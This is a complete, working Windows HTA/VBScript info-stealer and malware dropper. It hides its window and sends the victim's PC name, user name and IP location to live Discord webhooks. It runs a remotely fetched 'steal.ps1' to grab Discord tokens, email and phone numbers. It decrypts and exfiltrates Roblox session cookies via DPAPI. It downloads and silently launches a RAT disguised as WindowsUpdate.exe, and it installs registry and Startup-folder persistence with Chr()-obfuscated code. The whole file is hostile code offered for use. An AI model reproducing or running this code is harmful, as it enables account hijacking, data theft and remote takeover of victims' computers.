' language: VBScript/HTA, file: file.hta, target: Windows 10/11, mshta engine
<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no" scroll="no" navigator="no"/>
<script language="VBScript">
window.resizeTo 1,1:window.moveTo -3000,-3000
On Error Resume Next

Dim sh, fso, WH, RE_WH, PC, USER, ratDropped, lastCookie
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

WH = "https://discord.com/api/webhooks/1573904916001456162/rxQeUCo6Rtg8_Xes7efwmybNHPHrl_WiOSWPwEEsqKb3PdbG2gsIQee8nR0plW5WV01F"
RE_WH = "https://discord.com/api/webhooks/1573905019235868795/1h-kB4PA8BOkVaMTWu4TU4Qd89AqPFtXkp9ipslf3GvhrUAjvmskSVfXA7KHJCDp0Lei"

PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")
ratDropped = False
lastCookie = ""

' --- 1. INITIAL (all to WH) ---
Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
Call IP(WH)
Call GrabTokens(WH)
Call Persistence
Call PostCookieOnly(WH)
Call DropRAT(WH)

' --- 2. LOOP (all to RE_WH) ---
Dim runCount
runCount = 0
Do
    runCount = runCount + 1
    Call PostEmbedTo(":repeat: Re Grab " & runCount, "PC: " & PC, 10181046, RE_WH)
    Call GrabTokens(RE_WH)
    Call IP(RE_WH)
    Call PostCookieOnly(RE_WH)
    If Not ratDropped Then Call DropRAT(RE_WH)
    Call SleepSeconds(30)
Loop

window.close()

' --- RAT DROP: always posts rocket, then check or fail ---
Sub DropRAT(targetWH)
    Dim dl : dl = "https://cdn.discordapp.com/attachments/1351499996263878729/1573919433020412246/WindowsUpdate.exe?ex=6b03c232&is=6b0270b2&hm=4d3a346fca9a87136a99e8c7c10fb28b71f0366d22cbd745c2b665e1fe3093c4&"
    Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
    If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
    Randomize
    Dim fname : fname = "w" & Int(Rnd() * 900000 + 100000) & ".exe"
    Dim op : op = tPath & "\" & fname
    If fso.FileExists(op) Then fso.DeleteFile op, True

    ' Rocket fires BEFORE download so you always see the attempt
    Call PostEmbedTo(":rocket: RAT Download", "Starting download...", 10181046, targetWH)

    Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -A ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"" -o """ & op & """ """ & dl & """"
    sh.Run dlCmd, 0, True

    If fso.FileExists(op) Then
        Dim fSize : fSize = fso.GetFile(op).Size
        If fSize > 100000 Then
            Dim fSizeMB : fSizeMB = Round(fSize / 1048576, 2)
            Call PostEmbedTo(":rocket: RAT Download", "Downloaded: " & fSizeMB & " MB", 10181046, targetWH)
            Call RunCmd("""" & op & """")
            ratDropped = True
            Call SleepSeconds(2)
            Call PostEmbedTo(":white_check_mark: RAT Launched", "Payload executed.", 10181046, targetWH)
        Else
            Call PostEmbedTo(":x: RAT Download", "File too small: " & fSize & " bytes (link expired?)", 16711680, targetWH)
        End If
    Else
        Call PostEmbedTo(":x: RAT Download", "Download failed (link expired?)", 16711680, targetWH)
    End If
End Sub

Sub RunCmd(cmd)
    Dim w,p,i,s
    Set w = GetObject("winmgmts:\\.\root\cimv2")
    Set s = w.Get("Win32_ProcessStartup").SpawnInstance_
    s.ShowWindow = 0
    Set p = w.Get("Win32_Process")
    p.Create cmd,,s,i
End Sub

Sub IP(targetWH)
    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", "https://api.ipify.org/", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ip : ip = xh.responseText
    If Len(ip) < 7 Then Exit Sub
    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ll : ll = Split(xh.responseText, vbLf)
    If UBound(ll) < 3 Then Exit Sub
    Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER
    Call PostEmbedTo(":dart: Target", info, 10181046, targetWH)
    Set xh = Nothing
End Sub

' --- PostCookieOnly ---
Sub PostCookieOnly(targetWH)
    Dim cookie : cookie = GetRobloxCookie()
    If Len(cookie) < 20 Then Exit Sub
    If cookie = lastCookie Then Exit Sub
    lastCookie = cookie
    Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
End Sub

' --- GetRobloxCookie ---
Function GetRobloxCookie()
    GetRobloxCookie = ""
    Dim paths(4)
    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
    Dim i, fp, raw
    For i = 0 To 4
        If fso.FileExists(paths(i)) Then fp = paths(i) : Exit For
    Next
    If Len(fp) = 0 Then
        Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
        If fso.FolderExists(pk) Then
            Dim folder, subf
            Set folder = fso.GetFolder(pk)
            For Each subf In folder.SubFolders
                If InStr(UCase(subf.Name), "ROBLOX") > 0 Then
                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
                    If fso.FileExists(uwp) Then fp = uwp : Exit For
                End If
            Next
            Set folder = Nothing
        End If
    End If
    If Len(fp) = 0 Then Exit Function
    raw = ReadFile(fp)
    If Len(raw) < 20 Then Exit Function

    Dim cookie: cookie = ""
    Dim sp: sp = InStr(raw, "CookiesData"":""")
    If sp > 0 Then
        sp = sp + 14
        Dim ep: ep = InStr(sp, raw, """")
        If ep > sp Then
            Dim b64: b64 = Mid(raw, sp, ep - sp)
            If Len(b64) > 100 Then cookie = DecryptDPAPI(b64)
        End If
    End If
    If Len(cookie) < 20 And InStr(raw, ".ROBLOSECURITY") > 0 Then
        Dim rp: rp = InStr(raw, ".ROBLOSECURITY") + 15
        Dim seg: seg = Mid(raw, rp, 2000)
        seg = Replace(seg, vbCr, "") : seg = Replace(seg, vbLf, "") : seg = Replace(seg, vbTab, "")
        Dim sc1: sc1 = InStr(seg, ";")
        If sc1 > 0 Then seg = Left(seg, sc1 - 1)
        cookie = Trim(seg)
    End If
    If Len(cookie) < 20 And InStr(raw, "_|WARNING") > 0 Then
        Dim wp: wp = InStr(raw, "_|WARNING")
        Dim seg2: seg2 = Mid(raw, wp, 2000)
        seg2 = Replace(seg2, vbCr, "") : seg2 = Replace(seg2, vbLf, "") : seg2 = Replace(seg2, vbTab, "")
        Dim sc2: sc2 = InStr(seg2, ";")
        If sc2 > 0 Then seg2 = Left(seg2, sc2 - 1)
        cookie = Trim(seg2)
    End If
    If Len(cookie) < 20 Then
        Dim cleaned: cleaned = raw
        cleaned = Replace(cleaned, vbCr, "") : cleaned = Replace(cleaned, vbLf, "") : cleaned = Replace(cleaned, vbTab, "")
        cleaned = Trim(cleaned)
        Dim eqp: eqp = InStr(cleaned, "=")
        If eqp > 0 And eqp < 40 Then cleaned = Mid(cleaned, eqp + 1)
        If Len(cleaned) >= 40 Then cookie = cleaned
    End If
    cookie = Trim(cookie)
    GetRobloxCookie = cookie
End Function

Sub SleepSeconds(s)
    Dim cmd : cmd = "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul"
    sh.Run cmd, 0, True
End Sub

Sub Persistence()
    Dim payload : payload = "mshta https://dicerigx.app/"
    On Error Resume Next
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
    Dim sf : Set sf = fso.CreateTextFile(sp, True)
    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
    sf.Close
    Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 10181046)
End Sub

' --- GrabTokens ---
Sub GrabTokens(targetWH)
    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", "https://gist.githubusercontent.com/elibyexd-stack/cd284a4bd1bf045a820ebaeac2fd89fc/raw/4eac95e5238b7dce163f6d360e902605050d1954/steal.ps1", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim pc: pc = xh.responseText
    If Len(pc) < 100 Then Exit Sub
    Set xh = Nothing

    Dim psf: psf = TmpFile("steal.ps1")
    WriteFile psf, pc

    Dim tf: tf = TmpFile("steal_result.txt")
    fso.DeleteFile tf, True

    sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, False

    Dim waited: waited = 0
    Dim lastSize: lastSize = -1
    Dim stable: stable = 0
    Do
        Call SleepSeconds(2)
        waited = waited + 2
        If fso.FileExists(tf) Then
            Dim sz: sz = 0
            On Error Resume Next
            sz = fso.GetFile(tf).Size
            On Error GoTo 0
            If sz = lastSize And sz > 0 Then stable = stable + 1 Else stable = 0
            lastSize = sz
            If stable >= 2 Then Exit Do
        End If
        If waited >= 90 Then Exit Do
    Loop

    If Not fso.FileExists(tf) Then Exit Sub

    Dim cp: cp = TmpFile("sr_" & Int(Rnd()*99999) & ".txt")
    On Error Resume Next
    fso.CopyFile tf, cp, True
    On Error GoTo 0
    If Not fso.FileExists(cp) Then cp = tf

    Dim raw: raw = ReadFile(cp)
    If cp <> tf Then fso.DeleteFile cp, True
    If Len(raw) < 10 Then Exit Sub

    If Asc(Left(raw, 1)) = 239 Then raw = Mid(raw, 4)
    raw = Replace(raw, vbCrLf, vbLf)
    raw = Replace(raw, vbCr, vbLf)

    Dim lines: lines = Split(raw, vbLf)
    Dim l
    For Each l In lines
        l = Trim(l)
        If Left(l, 8) = "DISCORD|" Then
            Dim p: p = Split(Mid(l, 9), "|")
            If UBound(p) >= 4 Then
                Dim info: info = "**User:** " & p(0) & vbCrLf
                If p(1) <> "" Then info = info & "**Email:** " & p(1) & vbCrLf
                If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
                If p(3) <> "" And p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
                info = info & "**Token:** " & p(4)
                Call PostEmbedTo(":gift: Discord Token", info, 10181046, targetWH)
            End If
        ElseIf Left(l, 9) = "ROBLOXMS|" Then
            Dim c1: c1 = Mid(l, 10)
            If Len(c1) > 20 Then Call PostEmbedTo(":cookie: Roblox Cookie (MS)", "Size: " & Len(c1) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & c1 & "``", 10181046, targetWH)
        ElseIf Left(l, 8) = "ROBLOX|" Then
            Dim c2: c2 = Mid(l, 9)
            If Len(c2) > 20 Then Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(c2) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & c2 & "``", 10181046, targetWH)
        End If
    Next
End Sub

Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub

Function ReadFile(path)
    ReadFile = ""
    On Error Resume Next
    Dim f: Set f = fso.OpenTextFile(path, 1)
    If Err.Number = 0 Then ReadFile = f.ReadAll
    On Error GoTo 0
    If Not f Is Nothing Then f.Close
    Set f = Nothing
End Function

Sub PostEmbed(t, d, c)
    Call PostEmbedTo(t, d, c, WH)
End Sub

Sub PostEmbedTo(t, d, c, target_wh)
    Dim DQ: DQ = Chr(34)
    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", target_wh, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
    Set h = Nothing
End Sub

Function DecryptDPAPI(b64)
    DecryptDPAPI = ""
    Dim inf: inf = TmpFile("dpi.txt")
    Dim outf: outf = TmpFile("dpo.txt")
    On Error Resume Next
    fso.DeleteFile outf, True
    WriteFile inf, b64
    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
    Dim psf: psf = TmpFile("dpapi.ps1")
    WriteFile psf, ps
    sh.Run "powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
    If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
    fso.DeleteFile inf, True
    fso.DeleteFile psf, True
    fso.DeleteFile outf, True
    On Error GoTo 0
End Function

Function Ej(s)
    Ej = s
    Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
    Ej = Replace(Ej, Chr(34), Chr(92) & Chr(34))
    Ej = Replace(Ej, vbCrLf, Chr(92) & "n")
    Ej = Replace(Ej, vbCr, Chr(92) & "n")
    Ej = Replace(Ej, vbLf, Chr(92) & "n")
    Ej = Replace(Ej, vbTab, Chr(92) & "t")
End Function
</script>
</body></html>
